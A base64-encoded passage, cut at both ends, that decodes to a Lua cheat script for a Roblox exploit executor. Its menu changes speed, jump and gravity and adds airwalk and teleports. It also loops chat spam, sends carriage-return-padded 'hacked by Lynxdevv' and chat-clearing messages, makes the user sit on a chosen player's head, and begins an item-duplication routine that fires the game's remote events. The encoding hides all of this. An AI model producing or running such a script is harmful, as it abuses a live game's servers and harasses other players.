gpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBuaWwKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiByYXdnZXQoZ2V0Z2VudigpLCAiQ2FtZXJhQ29ubmVjdGlvbiIpIHRoZW4KICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBMb2NhbCBQbGF5ZXIgVGFiCmxvY2FsIExvY2FsUGxheWVyVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFMb2NhbFBsYXllciIsICJyYnhhc3NldGlkOi8vMTAxNTQ1NjcwMTM4ODY1In0pCgpsb2NhbCBTZWN0aW9uID0gTG9jYWxQbGF5ZXJUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfkaTvuLFQbGF5ZXIgc2V0dGluZ3MiCn0pCgpMb2NhbFBsYXllclRhYjpBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSAiU3BlZWQiLAogICAgUGxhY2Vob2xkZXJUZXh0ID0gIkluc2VydCB2YWx1ZSBoZXJlLi4uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgbG9jYWwgc3BlZWQgPSB0b251bWJlcih2YWx1ZSkKICAgICAgICBpZiBzcGVlZCBhbmQgcGwuQ2hhcmFjdGVyIGFuZCBwbC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICBwbC5DaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gc3BlZWQKICAgICAgICBlbHNlCiAgICAgICAgICAgIHdhcm4oIkludmFsaWQgc3BlZWQgb3IgY2hhcmFjdGVyIG5vdCBmb3VuZCEiKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJSZXNldCBzcGVlZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBwbC5DaGFyYWN0ZXIgYW5kIHBsLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgIHBsLkNoYXJhY3Rlci5IdW1hbm9pZC5XYWxrU3BlZWQgPSAxNgogICAgICAgIGVuZAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJBaXJ3YWxrIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIEZsYWcgPSAiQWlyV2Fsa1RvZ2dsZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGdldGdlbnYoKS5BaXJXYWxrRW5hYmxlZCA9IFZhbHVlCgogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCiAgICAgICAgaWYgbm90IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiQWlyV2Fsa1BsYXRmb3JtIikgdGhlbgogICAgICAgICAgICBsb2NhbCBwbGF0Zm9ybSA9IEluc3RhbmNlLm5ldygiUGFydCIpCiAgICAgICAgICAgIHBsYXRmb3JtLk5hbWUgPSAiQWlyV2Fsa1BsYXRmb3JtIgogICAgICAgICAgICBwbGF0Zm9ybS5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgcGxhdGZvcm0uU2l6ZSA9IFZlY3RvcjMubmV3KDUsIDEsIDUpCiAgICAgICAgICAgIHBsYXRmb3JtLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgcGxhdGZvcm0uQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgIHBsYXRmb3JtLlBhcmVudCA9IHdvcmtzcGFjZQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBwbGF0Zm9ybSA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiQWlyV2Fsa1BsYXRmb3JtIikKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5BaXJXYWxrRW5hYmxlZCBkbwogICAgICAgICAgICAgICAgaWYgaHVtYW5vaWRSb290UGFydCBhbmQgcGxhdGZvcm0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFkgPSBodW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlkgLSAzCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudFBvcyA9IHBsYXRmb3JtLlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm0uUG9zaXRpb24gPSBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5YLAogICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXRZLAogICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLloKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm0uQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIHBsYXRmb3JtIHRoZW4KICAgICAgICAgICAgICAgIHBsYXRmb3JtLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCkxvY2FsUGxheWVyVGFiOkFkZFRleHRCb3goewogICAgTmFtZSA9ICJKdW1wIiwKICAgIFBsYWNlaG9sZGVyVGV4dCA9ICJJbnNlcnQgdmFsdWUgaGVyZS4uLiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGxvY2FsIGp1bXBIZWlnaHQgPSB0b251bWJlcih2YWx1ZSkKICAgICAgICBpZiBqdW1wSGVpZ2h0IGFuZCBwbC5DaGFyYWN0ZXIgYW5kIHBsLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgIHBsLkNoYXJhY3Rlci5IdW1hbm9pZC5KdW1wUG93ZXIgPSBqdW1wSGVpZ2h0CiAgICAgICAgZWxzZQogICAgICAgICAgICB3YXJuKCJJbnZhbGlkIGp1bXAgaGVpZ2h0IG9yIGNoYXJhY3RlciBub3QgZm91bmQhIikKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUmVzZXQganVtcCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBwbC5DaGFyYWN0ZXIgYW5kIHBsLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgIHBsLkNoYXJhY3Rlci5IdW1hbm9pZC5KdW1wUG93ZXIgPSA1MAogICAgICAgIGVuZAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYjpBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSAiR3Jhdml0eSIsCiAgICBQbGFjZWhvbGRlclRleHQgPSAiSW5zZXJ0IHZhbHVlIGhlcmUuLi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBncmF2aXR5ID0gdG9udW1iZXIodmFsdWUpCiAgICAgICAgaWYgZ3Jhdml0eSB0aGVuCiAgICAgICAgICAgIHdvcmtzcGFjZS5HcmF2aXR5ID0gZ3Jhdml0eQogICAgICAgIGVsc2UKICAgICAgICAgICAgd2FybigiSW52YWxpZCBncmF2aXR5ISIpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkxvY2FsUGxheWVyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlJlc2V0IEdyYXZpdHkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgd29ya3NwYWNlLkdyYXZpdHkgPSAxOTYuMgogICAgZW5kCn0pCgpTZWN0aW9uID0gTG9jYWxQbGF5ZXJUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfkqzvuLFTcGFtIGNoYXQiCn0pCgpsb2NhbCBUZXh0U2F2ZQpsb2NhbCB0Y3MgPSBnYW1lOkdldFNlcnZpY2UoIlRleHRDaGF0U2VydmljZSIpCmxvY2FsIGNoYXQgPSB0Y3MuQ2hhdElucHV0QmFyQ29uZmlndXJhdGlvbiBhbmQgdGNzLkNoYXRJbnB1dEJhckNvbmZpZ3VyYXRpb24uVGFyZ2V0VGV4dENoYW5uZWwKCmZ1bmN0aW9uIHNlbmRjaGF0KG1zZykKICAgIGlmIG5vdCBtc2cgb3IgbXNnID09ICIiIHRoZW4gcmV0dXJuIGVuZAogICAgaWYgdGNzLkNoYXRWZXJzaW9uID09IEVudW0uQ2hhdFZlcnNpb24uTGVnYWN5Q2hhdFNlcnZpY2UgdGhlbgogICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOkZpbmRGaXJzdENoaWxkKCJEZWZhdWx0Q2hhdFN5c3RlbUNoYXRFdmVudHMiKS5TYXlNZXNzYWdlUmVxdWVzdDpGaXJlU2VydmVyKG1zZywgIkFsbCIpCiAgICAgICAgZW5kKQogICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgd2FybigiRXJyb3Igc2VuZGluZyBjaGF0OiAiIC4uIGVycikKICAgICAgICBlbmQKICAgIGVsc2VpZiBjaGF0IHRoZW4KICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGNoYXQ6U2VuZEFzeW5jKG1zZykKICAgICAgICBlbmQpCiAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICB3YXJuKCJFcnJvciBzZW5kaW5nIGNoYXQ6ICIgLi4gZXJyKQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKTG9jYWxQbGF5ZXJUYWI6QWRkVGV4dEJveCh7CiAgICBOYW1lID0gIkVudGVyIHRleHQiLAogICAgUGxhY2Vob2xkZXJUZXh0ID0gIkluc2VydCB5b3VyIG1lc3NhZ2UuLi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIFRleHRTYXZlID0gdGV4dAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJTZW5kIGNoYXQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgc2VuZGNoYXQoVGV4dFNhdmUpCiAgICBlbmQKfSkKCmdldGdlbnYoKS5DaGFvc0h1YlNlbmREZWxheSA9IDEKCkxvY2FsUGxheWVyVGFiOkFkZFNsaWRlcih7CiAgICBOYW1lID0gIlNwYW0gZGVsYXkiLAogICAgTWluID0gMC40LAogICAgTWF4ID0gMTAsCiAgICBEZWZhdWx0ID0gMSwKICAgIEluY3JlbWVudCA9IDAuMSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgZ2V0Z2VudigpLkNoYW9zSHViU2VuZERlbGF5ID0gVmFsdWUKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWI6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiU3BhbSBjaGF0ICgxKSIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBGbGFnID0gIlRleHQgU3Bhd25pbmciLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBnZXRnZW52KCkuQ2hhb3NIdWJTcGF3blRleHQgPSBWYWx1ZQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5DaGFvc0h1YlNwYXduVGV4dCBkbwogICAgICAgICAgICBzZW5kY2hhdChUZXh0U2F2ZSkKICAgICAgICAgICAgdGFzay53YWl0KGdldGdlbnYoKS5DaGFvc0h1YlNlbmREZWxheSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiU3BhbSBjaGF0ICgyLCBmaXhlZCkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJUZXh0Q2hhdFNlcnZpY2UiKS5DaGF0VmVyc2lvbiA9PSBFbnVtLkNoYXRWZXJzaW9uLlRleHRDaGF0U2VydmljZSB0aGVuIAogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlRleHRDaGF0U2VydmljZSIpLlRleHRDaGFubmVscy5SQlhHZW5lcmFsOlNlbmRBc3luYygiSGlcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJzZXJ2ZXIsIGhhY2tlZCBieSBMeW54ZGV2di4iKQogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHByaW50KCJOb3RoaW5nIikKICAgIGVuZAplbmQKfSkKCkxvY2FsUGxheWVyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkNsZWFyIGNoYXQgKGZpeGVkKSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlRleHRDaGF0U2VydmljZSIpLkNoYXRWZXJzaW9uID09IEVudW0uQ2hhdFZlcnNpb24uVGV4dENoYXRTZXJ2aWNlIHRoZW4gCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiVGV4dENoYXRTZXJ2aWNlIikuVGV4dENoYW5uZWxzLlJCWEdlbmVyYWw6U2VuZEFzeW5jKCJoaVxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJcclxyXHJccnNlcnZlciwgbGV0cyBjbGVhciB0aGUgY2hhdC4iKQogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHByaW50KCJOb3RoaW5nIikKICAgIGVuZAplbmQKfSkKClNlY3Rpb24gPSBMb2NhbFBsYXllclRhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAi8J+ms++4sUhlYWRzaXQiCn0pCgpsb2NhbCBzZWxlY3RlZEhlYWRTaXQgPSBuaWwKbG9jYWwgaGVhZFNpdENvbm5lY3Rpb24gPSBuaWwKCmxvY2FsIGhlYWRTaXREcm9wZG93biA9IExvY2FsUGxheWVyVGFiOkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSAiQ2hvb3NlIFBsYXllcjoiLAogICAgRGVmYXVsdCA9ICIiLAogICAgT3B0aW9ucyA9IHBsYXllcnMsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIHNlbGVjdGVkSGVhZFNpdCA9IFZhbHVlCiAgICBlbmQKfSkKCkxvY2FsUGxheWVyVGFiOkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIkhlYWRzaXQiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihib29sKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKCiAgICAgICAgaWYgbm90IHNlbGVjdGVkSGVhZFNpdCBvciBzZWxlY3RlZEhlYWRTaXQgPT0gIiIgdGhlbgogICAgICAgICAgICB3YXJuKCJObyBwbGF5ZXIgc2VsZWN0ZWQgZm9yIEhlYWQgU2l0ISIpCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBzZWxlY3RlZFBsYXllciA9IGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZEhlYWRTaXQpCgogICAgICAgIGlmIGJvb2wgdGhlbgogICAgICAgICAgICBpZiBzZWxlY3RlZFBsYXllciBhbmQgc2VsZWN0ZWRQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGh1bWFub2lkLlNpdCA9IHRydWUKCiAgICAgICAgICAgICAgICBpZiBoZWFkU2l0Q29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgaGVhZFNpdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3RlZFBsYXllci5DaGFyYWN0ZXIgYW5kIHNlbGVjdGVkUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIGFuZCBodW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIZWFkID0gc2VsZWN0ZWRQbGF5ZXIuQ2hhcmFjdGVyLkhlYWQKICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSB0YXJnZXRIZWFkLkNGcmFtZSAqIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkgKiBDRnJhbWUubmV3KDAsIDEuNiwgMC40KQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGVhZFNpdENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZFNpdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHdhcm4oIlNlbGVjdGVkIHBsYXllciBub3QgZm91bmQgb3IgaGFzIG5vIENoYXJhY3RlciEiKQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgaWYgaGVhZFNpdENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgaGVhZFNpdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUmVzZXQgbGlzdCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB1cGRhdGVkUGxheWVycyA9IHVwZGF0ZVBsYXllckxpc3QoKQogICAgICAgIGlmIGhlYWRTaXREcm9wZG93biBhbmQgdXBkYXRlZFBsYXllcnMgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBoZWFkU2l0RHJvcGRvd246UmVmcmVzaCh1cGRhdGVkUGxheWVycykKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBpZiBzZWxlY3RlZEhlYWRTaXQgYW5kIG5vdCBnYW1lLlBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRIZWFkU2l0KSB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZEhlYWRTaXQgPSBuaWwKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBoZWFkU2l0RHJvcGRvd246U2V0KCIiKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFUZWxlcG9ydHMiLCAicmJ4YXNzZXRpZDovLzEwNjIzMDczMTIwOTA2NyJ9KQoKLS0gVGVsZXBvcnQgQnV0dG9ucwpsb2NhbCB0ZWxlcG9ydEJ1dHRvbnMgPSB7CiAgICB7IlRvIHRoZSBCYWNrc3RhZ2UiLCBDRnJhbWUubmV3KDE5MiwgNCwgMjcyKX0sCiAgICB7IlRvIHRoZSBDaXR5IENlbnRlciIsIENGcmFtZS5uZXcoMTM2LCA0LCAxMTcpfSwKICAgIHsiVG8gdGhlIENyaW1lIEFyZWEiLCBDRnJhbWUubmV3KC0xMTksIC0yOCwgMjM1KX0sCiAgICB7IlRvIHRoZSBEZXNlcnRlZCBIb3VzZSIsIENGcmFtZS5uZXcoOTg2LCA0LCA2Myl9LAogICAgeyJUbyB0aGUgQWdlbmN5IFBvcnRhbCIsIENGcmFtZS5uZXcoNjcyLCA0LCAtMjk2KX0sCiAgICB7IlRvIHRoZSBIaWRlb3V0IiwgQ0ZyYW1lLm5ldyg1MDUsIC03NSwgMTQzKX0sCiAgICB7IlRvIHRoZSBTY2hvb2wiLCBDRnJhbWUubmV3KC0zMTIsIDQsIDIxMSl9LAogICAgeyJUbyB0aGUgQnJvb2sgQ2FmZSIsIENGcmFtZS5uZXcoMTYxLCA4LCA1Mil9LAogICAgeyJUbyB0aGUgU3RhcnRpbmcgUG9pbnQiLCBDRnJhbWUubmV3KC0yNiwgNCwgLTIzKX0sCiAgICB7IlRvIHRoZSBNYWluIEFyY2giLCBDRnJhbWUubmV3KC01ODksIDE0MSwgLTU5KX0sCiAgICB7IlRvIHRoZSBIb3NwaXRhbCIsIENGcmFtZS5uZXcoLTMwOSwgNCwgNzEpfSwKICAgIHsiVG8gdGhlIEFnZW5jeSBCYXNlIiwgQ0ZyYW1lLm5ldygxNzksIDQsIC00NjQpfSwKICAgIHsiVG8gdGhlIFdvcmtzaG9wJ3MgSGlkZGVuIFJvb20iLCBDRnJhbWUubmV3KDAsIDQsIC00OTUpfSwKICAgIHsiVG8gU2VjcmV0IFJvb20gMiIsIENGcmFtZS5uZXcoLTM0MywgNCwgLTYxMyl9LAogICAgeyJUbyB0aGUgSXNvbGF0ZWQgSXNsYW5kIiwgQ0ZyYW1lLm5ldygtMTkyNSwgMjMsIDEyNyl9LAogICAgeyJUbyB0aGUgSG90ZWwgU3F1YXJlIiwgQ0ZyYW1lLm5ldygxODIsIDQsIDE1MCl9LAogICAgeyJDbGltYiBNb3VudGFpbiAxIiwgQ0ZyYW1lLm5ldygtNjcwLCAyNTEsIDc2NSl9LAogICAgeyJUbyB0aGUgTWFpbiBCYW5rIiwgQ0ZyYW1lLm5ldygyLjI4LCA0LjY1LCAyNTQuNTgpfSwKICAgIHsiVG8gdGhlIENsb3RoaW5nIFN0b3JlIiwgQ0ZyYW1lLm5ldygtNDYuMTUsIDQuNjUsIDI1My4yMCl9LAogICAgeyJUbyB0aGUgUmVmdWdlIiwgQ0ZyYW1lLm5ldygtODguNDgsIDIyLjA1LCAyNjIuMzQpfSwKICAgIHsiVG8gdGhlIERlbnRhbCBDbGluaWMiLCBDRnJhbWUubmV3KC01My41OCwgMjIuMTUsIDI2NS42MSl9LAogICAgeyJUbyB0aGUgQ2FmZXRlcmlhIiwgQ0ZyYW1lLm5ldygtOTcuMTIsIDQuNjUsIDI1NC45OSl9Cn0KCmZvciBfLCBidG4gaW4gaXBhaXJzKHRlbGVwb3J0QnV0dG9ucykgZG8KICAgIFRhYjpBZGRCdXR0b24oewogICAgICAgIGJ0blsxXSwKICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBidG5bMl0KICAgICAgICBlbmQKICAgIH0pCmVuZAoKCmxvY2FsIFRvb2xzVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFJdGVtcyIsICJyYnhhc3NldGlkOi8vNzYwNDM5NjQwOTkyMDkifSkKCi0tIENvbG9yIHRhYmxlCmxvY2FsIGNvbG9yc1RhYmxlID0gewogICAge05hbWUgPSAiUmVkIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApfSwKICAgIHtOYW1lID0gIk9yYW5nZSIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApfSwKICAgIHtOYW1lID0gIlllbGxvdyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApfSwKICAgIHtOYW1lID0gIkdyZWVuIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApfSwKICAgIHtOYW1lID0gIkN5YW4iLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMjU1KX0sCiAgICB7TmFtZSA9ICJCbHVlIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAyNTUpfSwKICAgIHtOYW1lID0gIlB1cnBsZSIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMTI4LCAwLCAxMjgpfSwKICAgIHtOYW1lID0gIkJsYWNrIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKX0KfQoKLS0gQnV0dG9uIHRvIGNvbG9yIHRoZSBtYXAKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQ29sb3IgTWFwIEZsb29yIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICBsb2NhbCB0b29sc2VsZWN0ZWQgPSAiUGFpbnRSb2xsZXIiCmxvY2FsIGR1cGVhbW90ID0gMTAwCmxvY2FsIHBpY2t0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQpsb2NhbCBjbGVhcnRvb2xyZW1vdGUgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDbGVhMXJUb29sMXMiKQpsb2NhbCBkdXBpbmcgPSB0cnVlCmxvY2FsIG9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKCmxvY2FsIEdyaXBQb3NUYWJsZSA9IHt9CmZvciBpID0gMSwgMTAwIGRvCiAgICBpZiBpID09IDEgdGhlbgogICAgICAgIHRhYmxlLmluc2VydChHcmlwUG9zVGFibGUsIFZlY3RvcjMubmV3KDAsIDUsIDApKSAKIC